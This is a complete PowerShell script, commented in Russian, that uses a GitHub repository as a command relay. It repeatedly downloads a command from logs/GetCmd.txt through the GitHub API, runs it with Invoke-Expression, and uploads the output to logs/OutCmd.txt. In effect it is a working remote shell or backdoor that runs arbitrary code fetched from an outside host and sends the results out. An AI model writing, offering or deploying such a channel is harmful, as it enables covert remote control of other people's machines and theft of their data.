$owner  = "your-username"
$repo   = "your-repo"
$branch = "main"  
$pathOut = "logs/OutCmd.txt"
$pathIn  = "logs/GetCmd.txt"

$headers = @{
    Authorization = "Bearer $token"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShellScript"
}

function Get-CommandFromGitHub {
    $url = "https://api.github.com/repos/$owner/$repo/contents/$pathIn"
    try {
        $res = Invoke-RestMethod -Uri $url -Headers $headers -Method GET
        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($res.content))
        return $decoded.Trim()
    }
    catch {
        Write-Host "❌ Не удалось получить команду: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Update-GitHubFile($path, $contentRaw) {
    $contentEncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($contentRaw))

    $getUrl = "https://api.github.com/repos/$owner/$repo/contents/$path"
    Write-Host "🔍 Проверка файла: $getUrl"

    try {
        $existing = Invoke-RestMethod -Uri $getUrl -Headers $headers -Method GET
        $sha = $existing.sha
        Write-Host "Файл существует. SHA: $sha" -ForegroundColor Yellow
    }
    catch {
        $sha = $null
        Write-Host "Файл не найден. Будет создан новый." -ForegroundColor Green
    }

    $body = @{
        message = "Обновление: $path"
        content = $contentEncoded
        branch  = $branch
    }
    if ($sha) { $body.sha = $sha }

    $bodyJson = $body | ConvertTo-Json -Depth 10

    try {
        $response = Invoke-RestMethod -Uri $getUrl `
                                      -Headers $headers `
                                      -Method PUT `
                                      -Body $bodyJson `
                                      -ContentType "application/json"
        Write-Host "✅ Обновлён: $($response.commit.sha)" -ForegroundColor Cyan
    }
    catch {
        Write-Host "❌ Ошибка при обновлении файла: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Главный цикл: читаем команду из GitHub и выполняем
while ($true) {
    Write-Host "⌛ Ожидание команды из $pathIn... (нажмите Ctrl+C для выхода)"
    $cmd = Get-CommandFromGitHub
    if (-not $cmd -or $cmd -eq "") {
        Start-Sleep -Seconds 10
        continue
    }

    if ($cmd -eq "exit") {
        Write-Host "🛑 Получена команда выхода. Завершение." -ForegroundColor Magenta
        break
    }

    Write-Host "▶ Выполнение команды: $cmd" -ForegroundColor Green

    try {
        $output = Invoke-Expression $cmd | Out-String
    }
    catch {
        $output = "[Ошибка выполнения команды] $($_.Exception.Message)"
    }

    Write-Host "📤 Отправка результата..."
    Update-GitHubFile -path $pathOut -contentRaw $output

    # Очищаем команду (чтобы не выполнять повторно)
    Update-GitHubFile -path $pathIn -contentRaw ""

    Start-Sleep -Seconds 10
}

Write-Host "Сессия завершена." -ForegroundColor Magenta
